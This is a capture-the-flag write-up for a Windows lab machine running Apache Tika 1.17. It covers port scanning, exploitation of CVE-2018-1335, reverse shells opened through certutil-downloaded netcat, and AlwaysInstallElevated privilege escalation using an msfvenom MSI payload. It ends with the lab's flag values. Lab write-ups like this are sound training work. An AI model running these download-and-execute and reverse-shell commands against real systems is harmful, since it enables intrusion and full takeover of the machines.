## Target: 10.65.176.182
### Recon
- Nmap: ``nmap -A -p- 10.65.176.182 -oA nmap
- We will add the IP of the target to our /etc/hosts file as _cyberlens.thm_
### Enumeration
- Open Ports:
	- **80**/tcp, **http**, Apache httpd 2.4.57 ((Win64))
	- **135**/tcp, **msrpc**, Microsoft Windows RPC
	- **139**/tcp, **netbios-ssn**, Microsoft Windows netbios-ssn
	- **445**/tcp, **microsoft-ds?**
	- **3389**/tcp, **ms-wbt-server**, Microsoft Terminal Services
	- **5985**/tcp, **http**, Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
	- **47001**/tcp, **http**, Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
	- **61777**/tcp, **http**, Jetty 8.y.z-SNAPSHOT
- Web Findings:
	- Port **80** takes us to a web page where we can upload a photo to peek at its metadata. I poked around with the tool to look for clues within the images on site, but found nothing of use.
	- **5985** and **47001** do not have active pages.
	- **61777 takes us to a welcome page for Apache Tika 1.17 Server**
### Vulnerabilities
- **Port 61777** will be our attack vector. There is an exploit for this platform [here](https://github.com/RhinoSecurityLabs/CVEs/blob/master/CVE-2018-1335/CVE-2018-1335.py).
### Exploitation Method #1
- The command we will execute will run a netcat executable that we will upload with a python server.
``python3 exploit.py cyberlens.thm 61777 "certutil -urlcache -f http://10.65.67.67:8000/nc.exe C:/Users/Public/nc.exe"``
then we run the exploit again
``python3 exploit.py 10.65.176.182 61777 "C:/Users/Public/nc.exe 10.65.67.67 4443 -e cmd.exe"``
_Note: The direction of the slashes matters. Keep things like this in mind when an exploit is mysteriously failing._
- We now have a shell!
### Post Exploitation Method #1
- Navigate to the cyberlens user's Desktop to view the _user.txt_ flag.
### Privilege Escalation Method #1
- Since we want to look for privesc vectors, we need to upload winPEAS.exe (x86) to the remote box. Once again we'll host the file on a python3 server and transfer it to the remote host with:
``certutil -urlcache -f http://10.65.67.67:8000/winPEAS.exe C:\Users\CyberLens\Desktop\winPEAS.exe``
- Once we run winPEAS, we notice that AlwaysInstallElevated is set to 1
[Info here](https://dmcxblue.gitbook.io/red-team-notes/privesc/unquoted-service-path)
- We will craft a msfvenom reverse shell payload
``msfvenom --platform windows --arch x64 --payload windows/x64/shell_reverse_tcp LHOST=10.65.67.67 LPORT=1337 --encoder x64/xor --iterations 9 --format msi --out AlwaysInstallElevated.msi``
and transfer it to the remote host
``certutil -urlcache -f http://10.65.67.67:8000/AlwaysInstallElevated.msi C:\Users\CyberLens\Desktop\AlwaysInstallElevated.msi``
- There is a special command to execute this file:
**``msiexec /quiet /qn /i AlwaysInstallElevated.msi``**
We are root!
### Exploitation Method #2
- We can just use a metasploit module: ``exploit/windows/http/apache_tika_jp2_jscript``
- Simply set the SRVHOST to our local IP and RHOSTS to our victim machine. Also set RPORT in this case to 61777 as discovered in our nmap scan.
- We run the exploit and get the shell!
### Post Exploitation Method #2
- Grab the user.txt flag.
### Privilege Escalation Method #2
- There is a particular exploit that will do the same thing as what we did manually, but first we have to find it by using:
		_post/multi/recon/local_exploit_suggester_	
- The exploit suggester will recommend the _exploit/windows/local/always_install_elevated_ exploit after it finishes running.
- We simply select it, set our session, and run.
### Flags
- User: _THM{T1k4-CV3-f0r-7h3-w1n}_
- Root: _THM{3lev@t3D-4-pr1v35c!}_
### Notes
- Would be useful to do a deep dive on winPEAS (and linPEAS for that matter) to become more familiar with common privesc vulnerabilities on systems.
